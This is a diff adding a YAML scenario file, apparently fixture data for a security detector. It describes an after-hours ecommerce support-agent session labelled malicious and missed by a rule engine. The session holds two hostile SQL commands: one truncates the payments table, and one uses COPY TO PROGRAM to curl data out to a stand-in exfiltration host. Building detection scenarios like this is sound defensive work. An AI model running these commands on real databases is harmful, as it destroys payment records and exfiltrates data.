@@ -1,0 +1,23 @@
+scenario_id: gen_ecommerce_25_data_tamper_mal_659
+family_id: gen_ecommerce_25_data_tamper_mal_fam659
+domain: ecommerce
+time_of_day: 02:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: support_agent
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE payments
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 192.168.12.61
+      port: 445
